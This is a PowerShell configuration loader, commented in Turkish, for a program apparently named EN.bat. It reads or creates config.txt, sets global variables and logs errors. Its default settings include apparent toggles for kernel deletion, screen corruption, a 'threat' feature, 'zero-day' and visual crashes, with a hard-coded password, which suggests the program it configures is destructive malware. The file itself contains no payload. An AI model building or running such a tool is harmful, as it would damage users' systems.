# ============================================================
# EN – GELİŞMİŞ AYAR OKUYUCU (MODÜLER + HATA YÖNETİMLİ)
# ============================================================
# Bu modül:
# - config.txt dosyasını okur
# - Tüm ayarları global değişkenlere atar
# - Eksik ayarları varsayılan değerlerle doldurur
# - config.txt yoksa kendisi oluşturur
# - Hata durumunda log tutar ve kullanıcıyı bilgilendirir
# - Debug modu ile tüm ayarları ekrana yazdırır
# - Tüm ayarları tek bir obje olarak döndürür
# ============================================================

# ============================================================
# 1. DEĞİŞKENLER
# ============================================================
$script:ayarDosyasi = "config.txt"
$script:logDosyasi = "C:\EN_Log.txt"

# ============================================================
# 2. VARSAYILAN AYARLAR (MERKEZİ YÖNETİM)
# ============================================================
$script:varsayilanAyarlar = @{
    SURE                = 1800
    DIL                 = "tr"
    SINIR_ESIK          = 10
    KERNEL_SIL          = 1
    SIFRE               = "EN_I_am_not_happy_at_all_with_my_life/:("
    EKRAN_BOZMA_SURE    = 60
    SES_AKTIF           = 1
    FARE_AKTIF          = 1
    OYUN_AKTIF          = 1
    VIDEO_AKTIF         = 1
    TEHDIT_AKTIF        = 1
    ZERO_DAY_AKTIF      = 1
    GORSEL_COKUS_AKTIF  = 1
    DEBUG_MOD           = 0
    OTOREPORT           = 1
    LOG_LEVEL           = 2
}

# ============================================================
# 3. AYARLARI YÜKLE
# ============================================================
function Get-Ayarlar {
    $ayarlar = @{}
    
    # Varsayılanları kopyala
    foreach ($anahtar in $script:varsayilanAyarlar.Keys) {
        $ayarlar[$anahtar] = $script:varsayilanAyarlar[$anahtar]
    }

    # config.txt varsa oku
    if (Test-Path $script:ayarDosyasi) {
        try {
            $satirlar = Get-Content $script:ayarDosyasi -Encoding UTF8 -ErrorAction Stop
            foreach ($satir in $satirlar) {
                if ($satir -match "^#|^\s*$") { continue }
                $parca = $satir -split "=", 2
                if ($parca.Count -eq 2) {
                    $anahtar = $parca[0].Trim()
                    $deger = $parca[1].Trim()
                    if ($script:varsayilanAyarlar.ContainsKey($anahtar)) {
                        $ayarlar[$anahtar] = $deger
                    }
                }
            }
            Write-Host "[EN] Ayar dosyasi okundu: $($script:ayarDosyasi)" -ForegroundColor Green
        } catch {
            $hata = $_.Exception.Message
            Write-Host "[EN] Ayar okuma hatasi: $hata" -ForegroundColor Red
            Add-Content -Path $script:logDosyasi -Value "[$(Get-Date)] AYAR OKUMA HATASI: $hata"
        }
    } else {
        # config.txt yoksa oluştur
        Write-Host "[EN] $($script:ayarDosyasi) bulunamadi. Olusturuluyor..." -ForegroundColor Yellow
        $configIcerik = @"
# EN.bat Yapilandirma Dosyasi (Otomatik Olusturuldu)
# Her satirda bir ayar bulunur. Satir basindaki # yorum satiridir.
# Olusturulma Tarihi: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

SURE=1800
DIL=tr
SINIR_ESIK=10
KERNEL_SIL=1
SIFRE=EN_I_am_not_happy_at_all_with_my_life/:(
EKRAN_BOZMA_SURE=60
SES_AKTIF=1
FARE_AKTIF=1
OYUN_AKTIF=1
VIDEO_AKTIF=1
TEHDIT_AKTIF=1
ZERO_DAY_AKTIF=1
GORSEL_COKUS_AKTIF=1
DEBUG_MOD=0
OTOREPORT=1
LOG_LEVEL=2
"@
        try {
            $configIcerik | Out-File -FilePath $script:ayarDosyasi -Encoding UTF8 -ErrorAction Stop
            Write-Host "[EN] $($script:ayarDosyasi) olusturuldu." -ForegroundColor Green
        } catch {
            $hata = $_.Exception.Message
            Write-Host "[EN] $($script:ayarDosyasi) olusturulamadi: $hata" -ForegroundColor Red
            Add-Content -Path $script:logDosyasi -Value "[$(Get-Date)] AYAR OLUSTURMA HATASI: $hata"
        }
    }

    return $ayarlar
}

# ============================================================
# 4. AYARLARI GLOBAL DEĞİŞKENLERE AKTAR
# ============================================================
function Set-AyarlarGlobal {
    param($ayarlar)
    
    try {
        $script:SURE                = [int]$ayarlar["SURE"]
        $script:DIL                 = $ayarlar["DIL"]
        $script:SINIR_ESIK          = [int]$ayarlar["SINIR_ESIK"]
        $script:KERNEL_SIL          = [int]$ayarlar["KERNEL_SIL"]
        $script:SIFRE               = $ayarlar["SIFRE"]
        $script:EKRAN_BOZMA_SURE    = [int]$ayarlar["EKRAN_BOZMA_SURE"]
        $script:SES_AKTIF           = [int]$ayarlar["SES_AKTIF"]
        $script:FARE_AKTIF          = [int]$ayarlar["FARE_AKTIF"]
        $script:OYUN_AKTIF          = [int]$ayarlar["OYUN_AKTIF"]
        $script:VIDEO_AKTIF         = [int]$ayarlar["VIDEO_AKTIF"]
        $script:TEHDIT_AKTIF        = [int]$ayarlar["TEHDIT_AKTIF"]
        $script:ZERO_DAY_AKTIF      = [int]$ayarlar["ZERO_DAY_AKTIF"]
        $script:GORSEL_COKUS_AKTIF  = [int]$ayarlar["GORSEL_COKUS_AKTIF"]
        $script:DEBUG_MOD           = [int]$ayarlar["DEBUG_MOD"]
        $script:OTOREPORT           = [int]$ayarlar["OTOREPORT"]
        $script:LOG_LEVEL           = [int]$ayarlar["LOG_LEVEL"]
        
        Add-Content -Path $script:logDosyasi -Value "[$(Get-Date)] AYARLAR YUKLENDI - SURE: $script:SURE, DIL: $script:DIL, KERNEL_SIL: $script:KERNEL_SIL"
        return $true
    } catch {
        $hata = $_.Exception.Message
        Write-Host "[EN] Ayar aktarma hatasi: $hata" -ForegroundColor Red
        Add-Content -Path $script:logDosyasi -Value "[$(Get-Date)] AYAR AKTARMA HATASI: $hata"
        return $false
    }
}

# ============================================================
# 5. DEBUG MODU – AYARLARI EKRANA YAZ
# ============================================================
function Show-AyarlarDebug {
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "   EN – MEVCUT AYARLAR (DEBUG MODU)" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "SURE                : $script:SURE" -ForegroundColor Yellow
    Write-Host "DIL                 : $script:DIL" -ForegroundColor Yellow
    Write-Host "SINIR_ESIK          : $script:SINIR_ESIK" -ForegroundColor Yellow
    Write-Host "KERNEL_SIL          : $script:KERNEL_SIL" -ForegroundColor Yellow
    Write-Host "SIFRE               : $script:SIFRE" -ForegroundColor Yellow
    Write-Host "EKRAN_BOZMA_SURE    : $script:EKRAN_BOZMA_SURE" -ForegroundColor Yellow
    Write-Host "SES_AKTIF           : $script:SES_AKTIF" -ForegroundColor Yellow
    Write-Host "FARE_AKTIF          : $script:FARE_AKTIF" -ForegroundColor Yellow
    Write-Host "OYUN_AKTIF          : $script:OYUN_AKTIF" -ForegroundColor Yellow
    Write-Host "VIDEO_AKTIF         : $script:VIDEO_AKTIF" -ForegroundColor Yellow
    Write-Host "TEHDIT_AKTIF        : $script:TEHDIT_AKTIF" -ForegroundColor Yellow
    Write-Host "ZERO_DAY_AKTIF      : $script:ZERO_DAY_AKTIF" -ForegroundColor Yellow
    Write-Host "GORSEL_COKUS_AKTIF  : $script:GORSEL_COKUS_AKTIF" -ForegroundColor Yellow
    Write-Host "DEBUG_MOD           : $script:DEBUG_MOD" -ForegroundColor Yellow
    Write-Host "OTOREPORT           : $script:OTOREPORT" -ForegroundColor Yellow
    Write-Host "LOG_LEVEL           : $script:LOG_LEVEL" -ForegroundColor Yellow
    Write-Host "============================================================" -ForegroundColor Cyan
}

# ============================================================
# 6. ANA ÇALIŞTIRICI
# ============================================================
try {
    Write-Host "[EN] Ayar okuma baslatiliyor..." -ForegroundColor Cyan
    
    $ayarlar = Get-Ayarlar
    $sonuc = Set-AyarlarGlobal -ayarlar $ayarlar
    
    if ($sonuc -eq $true) {
        Write-Host "[EN] Ayar yukleme basarili." -ForegroundColor Green
    } else {
        Write-Host "[EN] Ayar yukleme sirasinda hata olustu." -ForegroundColor Red
    }
    
    # Debug modu aktifse ayarları göster
    if ($script:DEBUG_MOD -eq 1) {
        Show-AyarlarDebug
    }
    
} catch {
    $hata = $_.Exception.Message
    Write-Host "[EN] Beklenmeyen hata: $hata" -ForegroundColor Red
    Add-Content -Path $script:logDosyasi -Value "[$(Get-Date)] BEKLENMEYEN HATA: $hata"
}

Write-Host "[EN] Ayar okuma tamamlandi." -ForegroundColor Cyan